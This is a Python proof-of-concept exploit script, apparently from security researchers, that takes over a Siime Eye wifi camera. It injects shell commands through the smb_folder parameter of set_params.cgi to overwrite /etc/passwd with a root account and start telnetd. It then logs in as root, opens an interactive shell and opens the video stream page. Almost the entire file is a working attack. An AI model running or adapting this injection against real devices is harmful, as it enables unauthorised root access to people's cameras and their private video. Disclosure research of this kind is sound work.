#!/usr/bin/python

#
# Connect to the Siime Eye over wifi, then run this. It should pop the .html document containing the video stream and other info, plus a shell.
# This version brings up telnet with code injection - it's faster than using the semi-official telnet mechanism, which requires a restart! This doesn't.
# TS, PTP - March 2017
#

import telnetlib
import sys
import webbrowser
import socket
import requests
from time import sleep
from requests.auth import HTTPDigestAuth

siime = "192.168.1.1"

scrapeFile = "./siime_siphon_demo.htm"

#
# Couple of code injections, one to write a new line to /etc/passwd, the other to bring up telnetd

altquickTel1 = "http://"+siime+"/set_params.cgi?record=1&reinit_record=1&save=1&record_schedule_sun1=0&record_schedule_mon1=0&record_schedule_tue1=0&record_schedule_wed1=0&record_schedule_thu1=0&record_schedule_fri1=0&record_schedule_sat1=0&record_schedule_sun2=0&record_schedule_mon2=0&record_schedule_tue2=0&record_schedule_wed2=0&record_schedule_thu2=0&record_schedule_fri2=0&record_schedule_sat2=0&record_schedule_sun3=0&record_schedule_mon3=0&record_schedule_tue3=0&record_schedule_wed3=0&record_schedule_thu3=0&record_schedule_fri3=0&record_schedule_sat3=0&alarm_record=0&manual_record_time=60&record_location=1&record_auto_del=0&smb_svr=192.168.1.1&smb_folder=%2froot%3becho%20%22root%3auHw3ypd846wro%3a0%3a0%3an%3a%2f%3a%2fbin%2fsh%22%3E%2fetc%2fpasswd%3b&smb_subfolder=%2Fls&smb_user=admin&smb_pwd=admin&json=1"
bringUpTelnet = "http://"+siime+"/set_params.cgi?record=1&reinit_record=1&save=1&record_schedule_sun1=0&record_schedule_mon1=0&record_schedule_tue1=0&record_schedule_wed1=0&record_schedule_thu1=0&record_schedule_fri1=0&record_schedule_sat1=0&record_schedule_sun2=0&record_schedule_mon2=0&record_schedule_tue2=0&record_schedule_wed2=0&record_schedule_thu2=0&record_schedule_fri2=0&record_schedule_sat2=0&record_schedule_sun3=0&record_schedule_mon3=0&record_schedule_tue3=0&record_schedule_wed3=0&record_schedule_thu3=0&record_schedule_fri3=0&record_schedule_sat3=0&alarm_record=0&manual_record_time=60&record_location=1&record_auto_del=0&smb_svr=192.168.1.1&smb_folder=%2froot%3btelnetd%3b&smb_subfolder=%2Fls&smb_user=admin&smb_pwd=admin&json=1"

newline = "\n"
counter = 0

def rootSiime():
	sys.stdout.write("[+] Getting a root shell and opening the stream...\n")

	username = "root" + newline
	password = "hello" + newline # This is NOT the reecam default password!
	telnet = telnetlib.Telnet(siime)
	telnet.read_until("login: ")
	telnet.write(username)
	telnet.read_until("Password: ")
	telnet.write(password)
	telnet.read_until("#")
	webbrowser.open_new(scrapeFile)
	while True:
		command = raw_input("#")
		telnet.write(command + newline)
		if command == "exit":
			sys.exit()
		print telnet.read_until("\n#")
		#sys.stdout.write(output)

while True:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	result = sock.connect_ex((siime,23))
	
	if result == 0:
		sys.stdout.write("[+] Telnet is open...\n")
		rootSiime()
	else:
		if counter == 0:
			result = sock.connect_ex((siime,80))
			if result == 0:
				sys.stdout.write("[+] Host is up...\n")
				sys.stdout.write("[+] Trying to turn on telnet...\n")
				r = requests.get(altquickTel1, auth=HTTPDigestAuth('admin', ''))
				if r.status_code != 200:
					sys.stdout.write("[+] That's not the Siime...\n\n")
					sys.exit()
				sleep(5)
				requests.get(bringUpTelnet, auth=HTTPDigestAuth('admin', ''))
				sys.stdout.write("[+] Waiting for telnet to come up...\n")
				counter = 1
			else:
				sys.stdout.write("[+] Can't find the Siime...\n")
				sys.exit()
		else:
			sleep(3)
			print "[+] Still waiting..."

